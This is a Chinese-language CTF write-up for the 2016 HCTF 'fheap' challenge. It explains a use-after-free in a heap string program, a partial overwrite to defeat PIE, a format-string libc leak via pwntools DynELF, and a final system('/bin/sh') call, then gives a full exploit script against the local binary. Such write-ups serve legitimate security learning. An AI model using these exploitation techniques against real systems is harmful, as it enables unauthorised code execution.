---
title: 2016-HCTF-fheap-[fastbin UAF,PIE,DynELF use fmt]
date: 2019-03-02 14:39:57
tags: [UAF,DynELF,PIE,format string]
---

## Analysis

```
Canary                        : Yes
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
```
程序有两个功能：1、create string 2、delete string
在create string函数中，当申请的字符串长度小于16字节时，会直接将字符串存放在堆中；如果大于等于16字节，就会另申请一块堆内存，并将指针存放在原堆块中。程序结构体如下所示

```
typedef struct String{
    union {
        char *buf;
        char array[16];
    } o;
    int len;
    void (*free)(struct String *ptr);
} String;
```
程序在delete string时free堆块，没有将堆指针设为NULL，导致存在UAF漏洞，可以通过UAF漏洞覆盖`void (*free)(struct String *ptr);`函数指针为我们想要执行的函数，因为函数开启了PIE，所以要绕过PIE。

## 利用UAF和partial overwrite绕过PIE
由于内存页的载入机制，PIE的随机化只能对单个内存页进行随机化，因为一个内存页的大小通常为0x1000，所以对于一个被随机化的地址来说，无论地址怎么变，它的低12bit，3个十六进制数不会变。所以可以通过partial overwrite，修改`void (*free)(struct String *ptr);`函数指针。
因为覆盖时只能覆盖整个字节（8bit或16bit，即2个或4个十六进制数），原函数指针后三位为0xD52，经观察puts函数`.text:0000000000000D2D                 call    _puts`后三位为0xD2D，所以只需要将0x52覆盖为0x2D就可以实现puts打印出puts的地址，然后减去0xD2D获取程序基址
```
        create(4,'bb')
        create(4,'cc')
        delete(1)
        delete(0)
        data='a' * 0x10 + 'b' * 0x8 + '\x2d'
        create(0x20, data)  #data被写进chunk1中
        delete(1)
        p.recvuntil('b' * 0x8)
        data = u64(p.recv(6).ljust(8,'\x00'))
        process_base = data - 0xd2d
        delete(0)

```
获取了程序的基址，接下来就是获取system函数的地址，因为程序为调用过system函数，所以使用pwntools的DynELF函数对程序使用的libc库进行搜索，获取system函数的地址。

## 利用UAF和格式化字符串漏洞获取system地址

DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，需要一个程序存在可以反复触发信息泄露的漏洞，从而可以不断泄露libc地址空间内的信息。
将`void (*free)(struct String *ptr);`覆盖为printf，进而构造利用格式化字符串漏洞泄露内存。leak函数如下
```
printf_plt = process_base + 0x9d0
def leak(addr):
        data = '%9$sAA' + '#'*(0x18 - len('%9$sAA')) + p64(printf_plt)
        create(0x20, data)
        p.recvuntil("quit")
        p.sendline("delete string")
        p.recvuntil('id:')
        p.sendline(str(1))
        p.recvuntil('sure?:')
        p.sendline('yes12345' + p64(addr))
        data = p.recvuntil('AA')[:-2]
        data += "\00"
        return data
```
发现printf函数调用时出现segmentation段错误，后来对比发现正常的printf函数流程在`<__printf+34>`当ZF=1时je会跳转，而`<__printf+7>:test   al,al`当al and al等于0时会将ZF标志寄存器置1，故al and al = 1时，je会跳转。段错误时，printf函数没有发生跳转，而是执行到`<__printf+36>`，发生错误。
```
0x7ff6ab807800 <__printf>:	sub    rsp,0xd8
   0x7ff6ab807807 <__printf+7>:	test   al,al
   0x7ff6ab807809 <__printf+9>:	mov    QWORD PTR [rsp+0x28],rsi
   0x7ff6ab80780e <__printf+14>:	mov    QWORD PTR [rsp+0x30],rdx
   0x7ff6ab807813 <__printf+19>:	mov    QWORD PTR [rsp+0x38],rcx
   0x7ff6ab807818 <__printf+24>:	mov    QWORD PTR [rsp+0x40],r8
   0x7ff6ab80781d <__printf+29>:	mov    QWORD PTR [rsp+0x48],r9
   0x7ff6ab807822 <__printf+34>:	je     0x7ff6ab80785b <__printf+91>
   0x7ff6ab807824 <__printf+36>:	movaps XMMWORD PTR [rsp+0x50],xmm0
   0x7ff6ab807829 <__printf+41>:	movaps XMMWORD PTR [rsp+0x60],xmm1
   0x7ff6ab80782e <__printf+46>:	movaps XMMWORD PTR [rsp+0x70],xmm2
   0x7ff6ab807833 <__printf+51>:	movaps XMMWORD PTR [rsp+0x80],xmm3
   0x7ff6ab80783b <__printf+59>:	movaps XMMWORD PTR [rsp+0x90],xmm4
   0x7ff6ab807843 <__printf+67>:	movaps XMMWORD PTR [rsp+0xa0],xmm5
   0x7ff6ab80784b <__printf+75>:	movaps XMMWORD PTR [rsp+0xb0],xmm6
   0x7ff6ab807853 <__printf+83>:	movaps XMMWORD PTR [rsp+0xc0],xmm7
   0x7ff6ab80785b <__printf+91>:	lea    rax,[rsp+0xe0]
   ......
```
所以讲`void (*free)(struct String *ptr);`指向0xF51，会将al置零
```
.text:0000000000000F51                 mov     eax, 0
.text:0000000000000F56                 call    _printf
.text:0000000000000F5B                 mov     rdx, [rbp+nbytes] ; nbytes
```
测试后发现，printf可以正常打印出地址，但是只能执行一次，因为DynELF要求leak函数能够重复执行，分析发现，原来的leak函数中函数指针指向print@plt，调用函数，函数的返回值不变，执行`delete(1)`后，能根据返回值，返回到菜单界面，再次执行`delete(0)`，而将函数指针指向0xF51时，调用了一个call，函数的返回到0xF5B，程序返回不到原来的菜单界面。
最后通过在leak函数前，再次`create(0x20,data)`，释放堆快，重新布局内存空间，不需要将函数指针指向0xF51也可以正常执行printf函数。
泄露出system函数地址后，再次利用函数指针，执行`/bin/sh;`获取shell。

## EXP
```
#!/usr/bin/env python
from pwn import *

p = process('./fheap')
DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = "debug")

def create(size,content):
	p.recvuntil("quit")
	p.sendline("create string")
	p.recvuntil("size:")
	p.sendline(str(size))
	p.recvuntil('str:')
	p.sendline(content.ljust(size,'\x00'))
	p.recvuntil('n')

def delete(idx):
	p.recvuntil("quit")
	p.sendline("delete string")
	p.recvuntil('id:')
	p.sendline(str(idx))
	p.recvuntil('sure?:')
	p.send('yes '+'\n')

printf_plt = 0

def leak(addr):
	delete(0)
	data = '%9$sAA' + '#'*(0x18 - len('%9$sAA')) + p64(printf_plt)
  create(0x20, data)
  p.recvuntil("quit")
  p.sendline("delete string")
  p.recvuntil('id:')
  p.sendline(str(1))
  p.recvuntil('sure?:')
  p.sendline('yes12345' + p64(addr))
  data = p.recvuntil('AA')[:-2]
	data += "\00"
	return data

def pwn():
	global printf_plt
	create(4,'bb')
	create(4,'cc')
	delete(1)
	delete(0)
	#get the base address of process due to the process has opened ASLR(PIE).
	data='a' * 0x10 + 'b' * 0x8 + '\x2d'
	create(0x20, data)
	delete(1)
	p.recvuntil('b' * 0x8)
	data = u64(p.recv(6).ljust(8,'\x00'))
	process_base = data - 0xd2d
	log.success('process_base:'+hex(process_base))
	printf_plt = process_base + 0x9d0
	log.success('printf_plt:'+hex(printf_plt))
	delete(0)

	data = 'a' * 0x10 + 'b' * 0x8 + '\x2d'
	create(0x20,data)
	delete(1)
	d = DynELF(leak,process_base,elf = ELF('./fheap'))
	system_addr = d.lookup('system','libc')
	delete(0)
	log.success('system_addr:'+hex(system_addr))

	data = '/bin/sh;' + '#'*(0x18 - len('/bin/sh;')) + p64(system_addr)
	create(0x20,data)
	delete(1)
	p.interactive()

if __name__ == '__main__':
	pwn()

```
